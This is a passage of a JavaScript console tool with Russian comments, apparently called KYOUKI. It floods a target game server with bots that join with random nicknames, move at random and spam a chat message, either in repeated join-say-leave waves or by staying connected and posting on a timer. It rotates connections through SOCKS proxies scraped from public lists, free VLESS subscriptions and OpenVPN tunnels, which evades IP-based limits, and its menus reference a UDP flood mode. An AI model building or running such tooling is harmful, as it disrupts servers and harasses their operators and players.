                    log(`OVPN: волна ${cycle} через ${t.via || t.label}`, 'info');
                }
            } catch (e) {
                log(`OVPN ротация: ${e.message}`, 'warning');
            }
        }

        const t0 = Date.now();
        let connectedCount = 0;
        let errorCount = 0;
        let echoOk = 0;
        const errGroups = new Map(); // "прокси | причина" -> count (вместо спама построчно)
        const tasks = [];

        for (let i = 1; i <= totalBots && floodRunning; i++) {
            const proxyIndex = useProxies ? Math.floor((i - 1) / perProxyCount) % alive.length : -1;
            const botOnProxy = ((i - 1) % perProxyCount) + 1;
            const proxy = proxyIndex >= 0 ? alive[proxyIndex] : null;
            const proxyLabel = proxy ? (proxy.via || `${proxy.ip}:${proxy.port}`) : 'прямой IP';

            tasks.push((async (idx, px, lbl, onPx) => {
                let counted = false;
                const markError = (reason) => {
                    if (counted) return;
                    counted = true;
                    errorCount++;
                    untrack(botRef.bot);
                    // Тихий режим: копим группы, покажем сводно в конце волны
                    const short = String(reason || '').split('\n')[0].slice(0, 90);
                    const key = `${lbl} | ${short}`;
                    errGroups.set(key, (errGroups.get(key) || 0) + 1);
                    if (config.verbose) {
                        log(`Бот ${idx}/${totalBots} [${lbl}] ошибка: ${reason}`, 'error');
                    }
                };
                const botRef = { bot: null };
                try {
                    // Пустой ник = bot.js сгенерирует случайный каждому боту
                    const bot = await createBot(ip, port, config.botNickname || '', px);
                    botRef.bot = bot;
                    myBots.push(bot);
                    let stopMove = null;
                    bot.once('connected', async () => {
                        if (counted || !floodRunning) return;
                        counted = true;
                        const stayMode = config.floodMode === 'stay';
                        try {
                            connectedCount++;
                            await delay(800);
                            if (!floodRunning) return;
                            try { if (bot.sendInput) bot.sendInput(); } catch (e) {}
                            // Хаотичные движения сразу после входа
                            if (config.randomMove) {
                                try { stopMove = startRandomMove(bot); } catch (e) {}
                            }
                            if (!config.turboMode && config.enableMessage && config.botMessage) {
                                const ok = await sayWithEcho(bot, config.botMessage);
                                if (ok) {
                                    echoOk++;
                                } else if (!floodRunning) {
                                    return;
                                } else {
                                    log(`Бот ${idx}: эха нет за 3 попытки — сервер съел чат`, 'warning');
                                }
                            }
                            if (stayMode) {
                                // РАССЫЛКА: сидим, шлём каждые N секунд до stop/Ctrl+X.
                                // Нет эха — всё равно сидим, следующая попытка через N сек.
                                const gapMs = Math.max(5, parseInt(config.sayIntervalSec) || 30) * 1000;
                                try {
                                    bot.__sayTimer = setInterval(async () => {
                                        if (!floodRunning) return;
                                        try { if (bot.sendInput) bot.sendInput(); } catch (e) {}
                                        if (config.turboMode || !config.enableMessage || !config.botMessage) return;
                                        try {
                                            const ok2 = await sayWithEcho(bot, config.botMessage);
                                            if (ok2) echoOk++;
                                        } catch (e) {}
                                    }, gapMs);
                                    sayTimers.add(bot.__sayTimer);
                                } catch (e) {}
                                return; // не выходим
                            }
                            // СПАМ: даём серверу обработать чат, выходим (цикл заведёт новых)
                            await delay(Math.max(parseInt(config.botDelay) || 0, 500));
                        } catch (e) {}
                        // Свой выход — тихо, без варнинга
                        try { if (stopMove) stopMove(); } catch (e) {}
                        try { clearBotTimers(bot); } catch (e) {}
                        try { bot.__leaving = true; await bot.Disconnect(); } catch (e) {}
                    });
                    bot.once('disconnect', (reason) => {
                        untrack(bot);
                        try { clearBotTimers(bot); } catch (e) {}
                        if (!counted) markError(reason || 'отключён до подключения');
                        else if (!stopping && !bot.__leaving) log(`Бот ${idx} кикнут: ${reason || ''}`, 'warning');
                    });
                    bot.once('error', (e) => {
                        if (!counted) markError((e && e.message) || String(e));
                    });
                    bot.connect();
                } catch (e) {
                    markError(e.message);
                }
            })(i, proxy, proxyLabel, botOnProxy));
            await delay(5);
        }

        await Promise.allSettled(tasks);
        // Ждём хендшейки волны (прерывается по stop)
        const settleUntil = Date.now() + 15000;
        while (floodRunning && (connectedCount + errorCount < totalBots) && Date.now() < settleUntil) {
            await delay(500);
        }
        if (!floodRunning) break;
        const pending = totalBots - connectedCount - errorCount;
        const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
        log(`Волна ${cycle} за ${elapsed}с: на сервере ${connectedCount}/${totalBots}, эхо ${echoOk}, ошибок ${errorCount}${pending > 0 ? `, в полёте ${pending}` : ''}`, connectedCount > 0 ? 'success' : 'error');
        // Сводка ошибок вместо 136 строк спама (в verbose уже выведены построчно)
        if (errorCount > 0 && !config.verbose) {
            const groups = [...errGroups.entries()].sort((a, b) => b[1] - a[1]).slice(0, 8);
            for (const [key, n] of groups) {
                log(`✗ ${key}${n > 1 ? ` ×${n}` : ''}`, 'error');
            }
            if (errGroups.size > 8) log(`... и ещё ${errGroups.size - 8} групп ошибок`, 'warning');
        }

        // РАССЫЛКА: одна волна, боты остаются сидеть с таймерами.
        // floodRunning НЕ сбрасываем — живут до stop/Ctrl+X.
        if (config.floodMode === 'stay') {
            const gapS = Math.max(5, parseInt(config.sayIntervalSec) || 30);
            log(`Рассылка: ${connectedCount} ботов сидят, сообщение каждые ${gapS}с (stop/Ctrl+X — выход)`, 'success');
            return;
        }

        // Пауза между волнами; если волна пустая — не спиновать, подождать 5с
        const gap = connectedCount === 0
            ? Math.max(parseInt(config.cycleDelay) || 0, 5000)
            : Math.max(parseInt(config.cycleDelay) || 0, 500);
        const gapUntil = Date.now() + gap;
        while (floodRunning && Date.now() < gapUntil) await delay(500);
    }
    floodRunning = false;
    log('Флуд остановлен', 'info');
}

let stopping = false;
async function stopBots() {
    // Экстренное отключение: сначала рвём цикл, потом сокеты
    floodRunning = false;
    if (!myBots.length) {
        log('Нет активных ботов', 'warning');
        return;
    }
    const n = myBots.length;
    stopping = true;
    try { await disconnectAllBots(); } catch (e) {}
    myBots = [];
    try {
        for (const t of moveTimers) { try { clearInterval(t); } catch (e) {} }
        moveTimers.clear();
        for (const t of sayTimers) { try { clearInterval(t); } catch (e) {} }
        sayTimers.clear();
    } catch (e) {}
    stopping = false;
    log(`Отключено ботов: ${n}`, 'success');
}

function showStatus() {
    let engineSt = '—';
    try {
        const engine = require('./lib/proxy-engine');
        engineSt = `${engine.engineLabel()}: ${engine.isRunning() ? 'работает' : 'остановлен'}`;
    } catch (e) {}
    log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 'info');
    log(`СТАТУС KYOUKI`, 'info');
    log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 'info');
    log(`Активных ботов: ${myBots.length}`, myBots.length > 0 ? 'success' : 'info');
    log(`Флуд: ${floodActive ? 'ИДЁТ' : 'стоп'}`, floodActive ? 'success' : 'info');
    log(`Сервер: ${config.serverAddress || 'не задан'}`, 'info');
    log(`Прокси в списке: ${config.proxyList.length}`, 'info');
    log(`Ботов на прокси: ${config.botsPerProxy}`, 'info');
    log(`Движок: ${engineSt}`, 'info');
    if (ovpnPool) {
        const list = ovpnPool.tunnels();
        log(`OVPN: туннелей ${list.filter((t) => t.alive).length}/${list.length}${ovpnPool.activeId ? `, активный ${ovpnPool.activeId}` : ''}, боты ${config.ovpnForBots ? 'ВКЛ' : 'выкл'}, флуд ${config.floodUseOvpn ? 'ВКЛ' : 'выкл'}`, 'info');
    }
    log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`, 'info');
}

// ---------- прокси: проверка UDP (как proxyTestOne в renderer.js) ----------
function proxyTestOne(p, timeoutMs) {
    return new Promise((resolve) => {
        const t0 = Date.now();
        let done = false;
        let client = null;
        let controlSocket = null;
        const timer = setTimeout(() => finish(false, 'associate: timeout'), (timeoutMs || 6000) + 1000);
        function finish(ok, info) {
            if (done) return;
            done = true;
            clearTimeout(timer);
            try { if (client) client.removeAllListeners(); } catch (e) {}
            try { if (controlSocket) controlSocket.destroy(); } catch (e) {}
            resolve({ ok, ms: Date.now() - t0, info });
        }
        (async () => {
            let relay;
            try {
                const { SocksClient } = require('socks');
                const proxyOpts = { host: String(p.ip).trim(), port: Number(p.port), type: 5 };
                if (p.username) proxyOpts.userId = String(p.username);
                if (p.password) proxyOpts.password = String(p.password);
                const info = await new Promise((res, rej) => {
                    const c = (client = new SocksClient({
                        proxy: proxyOpts,
                        command: 'associate',
                        destination: { host: '8.8.8.8', port: 53 },
                        timeout: timeoutMs || 6000,
                    }));
                    c.once('established', (info) => {
                        controlSocket = info && info.socket;
                        res(info);
                    });
                    c.once('error', (err) => rej(err));
                    try { c.connect(); } catch (e) { rej(e); }
                });
                controlSocket = info && info.socket;
                relay = info && info.remoteHost;
            } catch (e) {
                finish(false, 'associate: ' + ((e && e.message) || String(e)));
                return;
            }
            if (!relay || !relay.port) {
                finish(false, 'associate: no relay');
                return;
            }
            let relayHost = relay.host;
            if (!relayHost || relayHost === '0.0.0.0' || relayHost === '::') relayHost = String(p.ip).trim();
            try {
                const r = await testUdpRelay({ relayHost, relayPort: relay.port, timeoutMs: 5000 });
                if (r.ok) finish(true, `${relayHost}:${relay.port} · UDP ok · ${r.ms} ms`);
                else finish(false, 'udp: ' + (r.error || 'no reply'));
            } catch (e) {
                finish(false, 'udp: ' + (e.message || String(e)));
            }
        })();
    });
}

async function checkProxies() {
    const list = PU.parseProxies(config.proxyList, (m) => log(m, 'warning'));
    if (!list.length) {
        log('Список прокси пуст', 'warning');
        return;
    }
    log(`Проверка UDP: ${list.length} прокси, 10 потоков...`, 'info');
    let ok = 0;
    let idx = 0;
    const aliveLines = [];
    const WORKERS = 10;
    async function worker() {
        while (idx < list.length) {
            const i = idx++;
            const p = list[i];
            const label = `${p.ip}:${p.port}`;
            try {
                const r = await proxyTestOne(p, 6000);
                if (r.ok) {
                    ok++;
                    aliveLines.push(TU.proxyToLine(p));
                    log(`[+] ${label} — ${r.info}`, 'success');
                } else {
                    log(`[-] ${label} — ${r.info}`, 'warning');
                }
            } catch (e) {
                log(`[-] ${label} — ${e.message}`, 'warning');
            }
        }
    }
    await Promise.all(Array.from({ length: Math.min(WORKERS, list.length) }, () => worker()));
    log(`Итог: живых ${ok}/${list.length}`, ok > 0 ? 'success' : 'error');
    if (ok > 0) {
        config.proxyList = aliveLines;
        setProxies(PU.parseProxies(aliveLines, () => {}));
        saveConfigSilent();
        log(`Оставлены только живые (${ok}), список сохранён`, 'success');
    }
}

async function scrapeSocks() {
    log('Сбор SOCKS4/5 из публичных источников...', 'info');
    try {
        const { scrapeAll } = require('./lib/proxy-scraper');
        const proxies = await scrapeAll((name, s, count, err) => {
            log(`${name}: ${s ? `+${count}` : `ошибка (${err || 'fail'})`}`, s ? 'info' : 'warning');
        });
        if (!proxies.length) {
            log('Источники пусты/недоступны, найдено 0', 'warning');
            return;
        }
        config.proxyList = proxies.map((p) => `${p.ip}:${p.port}`);
        setProxies(PU.parseProxies(config.proxyList, () => {}));
        saveConfigSilent();
        log(`Собрано: ${proxies.length} прокси`, 'success');
        const ans = await ask('Проверить UDP сразу? (y/n): ');
        if (/^(y|yes|д|да)/i.test(ans)) await checkProxies();
    } catch (e) {
        log(`Ошибка скрейпинга: ${e.message}`, 'error');
    }
}

// ---------- xray (старый функционал: подписка -> движок -> локальные SOCKS5) ----------
async function startEngineWithLinks(links) {
    if (config.engine === 'ovpn') {
        log('Движок ovpn: используй пункт [5] «Импорт .ovpn и запуск»', 'warning');
        return;
    }
    // Переключились на VLESS-движок — OVPN-пул (если жил) надо погасить,
    // иначе его health-луп будет поднимать туннели поверх нового движка.
    if (ovpnPool) {
        try { await ovpnPool.close(); } catch (e) {}
        ovpnPool = null;
    }
    const engine = require('./lib/proxy-engine');
    engine.setEngine(config.engine === 'xray' ? 'xray' : 'singbox');
    log(`Движок: ${engine.engineLabel()}, ссылок: ${links.length}`, 'info');
    await engine.ensureBinary((m) => engineLog(m));
    const ports = await engine.allocPorts(links.length);
    const endpoints = links.map((link, i) => ({ link, localPort: ports[i] }));
    const socks = await engine.start(endpoints, (m) => engineLog(m));
    const eps = socks.map((s) => s.socks);
    config.proxyList = eps.map((s) => TU.proxyToLine(s));
    setProxies(PU.parseProxies(config.proxyList, () => {}));
    saveConfigSilent();
    log(`${engine.engineLabel()} поднят: ${eps.length} локальных SOCKS5`, 'success');
    for (const s of eps) log(`  127.0.0.1:${s.port}${s.via ? ` — ${s.via}` : ''}`, 'info');
}

async function importSubFlow() {
    const defUrl = config.vlessSubUrl || '';
    const url = await ask(`URL подписки${defUrl ? ` [${defUrl.slice(0, 60)}]` : ''}: `);
    const useUrl = url || defUrl;
    if (!useUrl) {
        log('URL не задан', 'error');
        return;
    }
    config.vlessSubUrl = useUrl;
    saveConfigSilent();
    try {
        const { importVlessFromUrls } = require('./lib/vless');
        log('Качаю подписки...', 'info');
        const { links, skipped, errors } = await importVlessFromUrls(useUrl, 15000, '');
        for (const e of errors || []) log(`Подписка недоступна (${e.url}): ${e.error}`, 'error');
        if (!links.length) {
            log(`Рабочих ссылок нет (пропущено: ${skipped})`, 'warning');
            return;
        }
        log(`Ссылок: ${links.length}, пропущено: ${skipped || 0}`, 'info');
        await startEngineWithLinks(links);
    } catch (e) {
        log(`Импорт не удался: ${e.message}`, 'error');
        try { await require('./lib/proxy-engine').stop(); } catch (err) {}
    }
}

// ---------- OVPN: .ovpn -> openvpn(TUN) -> локальные SOCKS5 -> proxyList ----------
function showTunnels() {
    if (!ovpnPool) {
        log('OVPN-пул ещё не создан (Движки → [8] или запуск ботов/флуда с OVPN)', 'warning');
        return;
    }
    const list = ovpnPool.tunnels();
    if (!list.length) {
        log('Туннелей нет', 'warning');
        return;
    }
    log(`OVPN-туннели: ${list.filter((t) => t.alive).length}/${list.length} живых, целей маршрута: ${ovpnPool.routeTargets.join(', ') || 'нет'}`, 'info');
    for (const t of list) {
        const mark = t.id === ovpnPool.activeId ? '[активный]' : '';
        log(`  ${t.id} ${t.alive ? 'UP  ' : 'DOWN'} tun=${t.tunIP || '—'} socks=127.0.0.1:${t.socksPort} ${t.label} ${mark}`, t.alive ? 'info' : 'warning');
    }
}

// Поднять туннели пула, не трогая ботов/флуд: SOCKS5 попадут в proxyList.
async function startOvpnTunnelsOnly() {
    const engine = require('./lib/proxy-engine');
    engine.setEngine('ovpn');
    try {
        await engine.ensureBinary((m) => engineLog(m));
    } catch (e) {
        log(e.message, 'error');
        return;
    }
    try {
        const pool = await ensureOvpnPool([]);
        const eps = pool.proxies();
        config.proxyList = eps.map((s) => TU.proxyToLine(s));
        setProxies(eps);
        saveConfigSilent();
        log(`OVPN: туннелей ${pool.aliveCount()}, SOCKS5 добавлены в список прокси`, 'success');
        for (const s of eps) log(`  ${s.ip}:${s.port} — ${s.via}`, 'info');
    } catch (e) {
        log(`OVPN не поднялся: ${e.message}`, 'error');
    }
}

async function importOvpnFlow() {
    const engine = require('./lib/proxy-engine');
    engine.setEngine('ovpn');
    const src = (config.ovpnDir || '').trim();
    if (!src) {
        log('Сначала укажи файл/папку .ovpn (пункт [6])', 'error');
        return;
    }
    try {
        const pool = getOvpnPool();
        pool.username = config.ovpnUsername || null;
        pool.password = config.ovpnPassword || null;
        const files = await pool.load(src);
        if (!files.length) {
            log('В указанном пути нет .ovpn файлов', 'error');
            return;
        }
        log(`OVPN конфигов: ${files.length}, движок: ${engine.engineLabel()}`, 'info');
        await engine.ensureBinary((m) => engineLog(m));
        await pool.close();
        await pool.start({ routeTargets: [] });
        const eps = pool.proxies();
        config.proxyList = eps.map((s) => TU.proxyToLine(s));
        setProxies(eps);
        saveConfigSilent();
        log(`OpenVPN поднят: туннелей ${pool.aliveCount()}/${files.length}, активный SOCKS5 ниже`, 'success');
        for (const s of eps) log(`  127.0.0.1:${s.port} — ${s.via || 'ovpn'}`, 'info');
        log('Боты (Bots → [o]) и UDP Flood (Flood → [9]) теперь могут ходить прямо через пул туннелей', 'success');
    } catch (e) {
        log(`OVPN не поднялся: ${e.message}`, 'error');
        try { await require('./lib/proxy-engine').stop(); } catch (_) {}
    }
}

async function scrapeVlessFlow() {
    log('Поиск бесплатных VLESS-подписок...', 'info');
    try {
        const { scrapeAll, parseLinks } = require('./lib/vless-scraper');
        const links = await scrapeAll((name, s, count, err) => {
            log(`${name}: ${s ? `+${count}` : `ошибка (${err || 'fail'})`}`, s ? 'info' : 'warning');
        });
        if (!links.length) {
            log('Найдено 0 ссылок', 'warning');
            return;
        }
        const endpoints = parseLinks(links);
        if (!endpoints.length) {
            log('Валидных endpoint\'ов: 0', 'warning');
            return;
        }
        log(`Распарсено endpoint'ов: ${endpoints.length}`, 'info');
        await startEngineWithLinks(endpoints);
    } catch (e) {
        log(`Ошибка: ${e.message}`, 'error');
    }
}

// ---------- навигация ----------
async function handleBotsMenu(input) {
    switch (input) {
        case '1':
            // В фон: промпт свободен, stop работает в любой момент
            startBots().catch((e) => log(`Флуд упал: ${e.message}`, 'error'));
            return;
        case '2': await stopBots(); break;
        case '3': showStatus(); break;
        case '4': {
            const v = await ask('Адрес сервера (IP:PORT): ');
            if (v) {
                const chk = PU.validateServerAddress(v);
                if (chk && chk.ok === false) log('Неверный формат, нужен IP:PORT', 'error');
                else { config.serverAddress = v; saveConfigSilent(); log(`Сервер: ${v}`, 'success'); }
            }
            break;
        }
        case '5': {
            const v = await ask('Никнейм (пусто = случайный каждому боту): ');
            config.botNickname = v;
            saveConfigSilent();
            log(v ? `Ник: ${v}` : 'Ники: случайные', 'success');
            break;
        }
        case '6': {
            const v = await ask('Сообщение (пусто = турбо без сообщений): ');
            config.botMessage = v;
            config.turboMode = !v;
            saveConfigSilent();
            log(v ? `Сообщение: ${v}` : 'Турбо режим (без сообщений)', 'success');
            break;
        }
        case '7': {
            const v = parseInt(await ask('Количество: '));
            if (v > 0) { config.botCount = v; saveConfigSilent(); log(`Количество: ${v}`, 'success'); }
            break;
        }
        case '8': {
            const v = Math.min(10, Math.max(1, parseInt(await ask('Ботов на прокси (1-10): ')) || 4));
            config.botsPerProxy = v; saveConfigSilent(); log(`Ботов на прокси: ${v}`, 'success');
            break;
        }
        case '9': {
            const v = parseInt(await ask('Задержка мс: '));
            if (v >= 0) { config.botDelay = v; saveConfigSilent(); log(`Задержка: ${v}мс`, 'success'); }
            break;
        }
        case 'v': case 'V':
            config.verbose = !config.verbose;
            saveConfigSilent();
            log(`Лог: ${config.verbose ? 'подробный (каждый бот)' : 'тихий (только ошибки и итоги)'}`, 'success');
            break;
        case 'm': case 'M':
            config.randomMove = !config.randomMove;
            saveConfigSilent();
            log(`Хаотичные движения: ${config.randomMove ? 'ВКЛ' : 'выкл'}`, 'success');
            break;
        case 'r': case 'R': {
            if (config.floodMode === 'stay') {
                config.floodMode = 'spam';
                saveConfigSilent();
                log('Режим: спам (зашёл-сказал-вышел циклами)', 'success');
            } else {
                config.floodMode = 'stay';
                const v = parseInt(await ask(`Интервал рассылки в секундах [${config.sayIntervalSec}]: `));
                if (v >= 5) config.sayIntervalSec = v;
                saveConfigSilent();
                log(`Режим: рассылка (сидят, сообщение каждые ${config.sayIntervalSec}с)`, 'success');
            }
            break;
        }
        case 'o': case 'O':
            config.ovpnForBots = !config.ovpnForBots;
            saveConfigSilent();
            log(`Боты через OVPN: ${config.ovpnForBots ? 'ВКЛ (активный туннель пула, SOCKS-список игнорируется)' : 'выкл (прокси/напрямую)'}`, 'success');
            break;
        case 'w': case 'W': {
            const v = parseInt(await ask('Ротация OVPN, волн (0 = выкл): '));
            config.ovpnRotateWaves = !v || v <= 0 ? 0 : Math.max(1, v);
            saveConfigSilent();
            log(config.ovpnRotateWaves ? `Ротация OVPN: каждые ${config.ovpnRotateWaves} волн` : 'Ротация OVPN: выкл', 'success');
            break;
        }
        case '0': mode = 'main'; printMainMenu(); return;
        default: log('Нет такого пункта (0 — назад)', 'error');
    }
    await pauseAndRedraw();
}

async function handleProxiesMenu(input) {
    switch (input) {
        case '1': {
            const f = await ask('Файл с прокси: ');
            if (!f) break;
            try {
                const data = fs.readFileSync(f, 'utf8');
                const lines = data.split('\n').map((l) => l.trim()).filter(Boolean);
                const parsed = PU.parseProxies(lines, (m) => log(m, 'warning'));
                config.proxyList = parsed.map((p) => TU.proxyToLine(p));
                setProxies(parsed);
                saveConfigSilent();
                log(`Загружено прокси: ${parsed.length}`, 'success');
            } catch (e) {
                log(`Ошибка чтения файла: ${e.message}`, 'error');
            }
            break;
        }
        case '2': await scrapeSocks(); break;
        case '3': await checkProxies(); break;
        case '4':
            if (!config.proxyList.length) log('Список пуст', 'warning');
            else {
                console.log(`\nПрокси (${config.proxyList.length}):`);
                config.proxyList.slice(0, 20).forEach((p, i) => console.log(`  ${i + 1}. ${p}`));
                if (config.proxyList.length > 20) console.log(`  ... и ещё ${config.proxyList.length - 20}`);
            }
            break;
        case '5':
            config.proxyList = [];
            setProxies([]);
            saveConfigSilent();
            log('Список очищен', 'success');
            break;
        case '0': mode = 'main'; printMainMenu(); return;
        default: log('Нет такого пункта (0 — назад)', 'error');
    }
    await pauseAndRedraw();
}

async function handleXrayMenu(input) {
    const engine = require('./lib/proxy-engine');
    switch (input) {
        case '1': await importSubFlow(); break;
        case '2': await scrapeVlessFlow(); break;
        case '3':
            try { await engine.stop(); log('Движок остановлен', 'success'); }
            catch (e) { log(`Ошибка: ${e.message}`, 'error'); }
            break;
        case '4': {
            config.engine = config.engine === 'xray' ? 'singbox' : 'xray';
            saveConfigSilent();
            log(`Движок: ${config.engine}`, 'success');
            break;
        }
        case '5': await importOvpnFlow(); break;
        case '6': {
            const v = await ask(`Файл или папка с .ovpn [${config.ovpnDir || 'не задан'}]: `);
            if (v) {
                config.ovpnDir = v;
                saveConfigSilent();
                const pool = getOvpnPool();
                try {
                    const files = await pool.load(v);
                    log(`Путь: ${v}, найдено .ovpn: ${files.length}`, files.length ? 'success' : 'warning');
                } catch (e) {
                    log(`Путь: ${v} (разбор не удался: ${e.message})`, 'warning');
                }
            }
            break;
        }
        case '7': {
            const u = await ask('Логин OVPN (пусто = без auth-user-pass): ');
            config.ovpnUsername = u || '';
            if (u) {
                const p = await ask('Пароль OVPN: ');
                config.ovpnPassword = p || '';
            } else {
                config.ovpnPassword = '';
            }
            saveConfigSilent();
            log(config.ovpnUsername ? `OVPN креды: ${config.ovpnUsername}` : 'OVPN: без кредов', 'success');
            break;
        }
        case '8': await startOvpnTunnelsOnly(); break;
        case '9': showTunnels(); break;
        case '0': mode = 'main'; printMainMenu(); return;
        default: log('Нет такого пункта (0 — назад)', 'error');
    }
    await pauseAndRedraw();
}

async function handleCommand(input) {
    const cmd = (input || '').trim();
    if (!cmd) return;

    // Цифры главного меню
    if (mode === 'main') {
        switch (cmd) {
            case '1': mode = 'bots'; printBotsMenu(); return;
            case '2': mode = 'proxies'; printProxiesMenu(); return;
            case '3': mode = 'xray'; printXrayMenu(); return;
            case '4': showStatus(); await pauseAndRedraw(); return;
            case '5': mode = 'flood'; printFloodMenu(); return;
            case '0': case 'exit': case 'quit':
                try { await disconnectAllBots(); } catch (e) {}
                try { await stopFlood(true); } catch (e) {}
                try { if (ovpnPool) await ovpnPool.close(); } catch (e) {}
                try { await require('./lib/proxy-engine').stop(); } catch (e) {}
                log('Выход...', 'info');
                running = false;
                rl.close();
                return;
        }
    } else if (mode === 'bots') {
        if (['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'v', 'V', 'm', 'M', 'r', 'R', 'o', 'O', 'w', 'W'].includes(cmd)) {
            await handleBotsMenu(cmd);
            return;
        }
    } else if (mode === 'proxies') {
        if (['0', '1', '2', '3', '4', '5'].includes(cmd)) {
            await handleProxiesMenu(cmd);
            return;
        }
    } else if (mode === 'xray') {
        if (['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'].includes(cmd)) {
            await handleXrayMenu(cmd);
            return;
        }
    } else if (mode === 'flood') {
        if (['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'b', 'B', 'r', 'R'].includes(cmd)) {
            await handleFloodMenu(cmd);
            return;
        }
    }

    // Короткие команды работают в любом режиме
    const parts = cmd.split(/\s+/);
    const base = parts[0].toLowerCase();
    if (base === 'start') {
        // В фон: stop доступен сразу, экстренное отключение в любой момент
        startBots().catch((e) => log(`Флуд упал: ${e.message}`, 'error'));
        return;
    }
    if (base === 'stop') { await stopBots(); return; }
    if (base === 'status') { showStatus(); return; }
    if (base === 'exit' || base === 'quit') {
        try { await disconnectAllBots(); } catch (e) {}
        try { await stopFlood(true); } catch (e) {}
        try { if (ovpnPool) await ovpnPool.close(); } catch (e) {}
        try { await require('./lib/proxy-engine').stop(); } catch (e) {}
        log('Выход...', 'info');
        running = false;
        rl.close();
        return;
    }
    if (base === 'set' && parts.length >= 3) {
        const param = parts[1].toLowerCase();
        const value = parts.slice(2).join(' ');
        if (param === 'server') {
            const chk = PU.validateServerAddress(value);
            if (chk && chk.ok === false) { log('Нужен формат IP:PORT', 'error'); return; }
            config.serverAddress = value;
        }
        else if (param === 'nick' || param === 'nickname') config.botNickname = value;
        else if (param === 'message') { config.botMessage = value; config.turboMode = !value; }
        else if (param === 'count') config.botCount = parseInt(value) || config.botCount;
        else if (param === 'delay') config.botDelay = parseInt(value) || 0;
        else if (param === 'perproxy') config.botsPerProxy = Math.min(10, Math.max(1, parseInt(value) || 4));
        else if (param === 'turbo') config.turboMode = /^(on|1|true)/i.test(value);
        else { log(`Неизвестный параметр: ${param}`, 'error'); return; }
        saveConfigSilent();
        log('Сохранено', 'success');
        return;
    }

    log(`Неизвестная команда: ${cmd} (меню: 1 боты, 2 прокси, 3 xray, 4 статус, 5 флуд, 0 выход)`, 'error');
}

// Главная функция
async function main() {
    console.clear();
    printMainMenu();
    loadConfig();
    setPrompt();

    while (running) {
        const line = await readLine();
        if (!running) break;
        try {
            await handleCommand(line);
        } catch (e) {
            log(`Ошибка: ${e.message}`, 'error');
        }
        if (running) setPrompt();
    }
    process.exit(0);
}

// Запуск
if (require.main === module) {
    main().catch((e) => {
        console.error('Критическая ошибка:', e.message);
        process.exit(1);
    });
}

module.exports = { main };
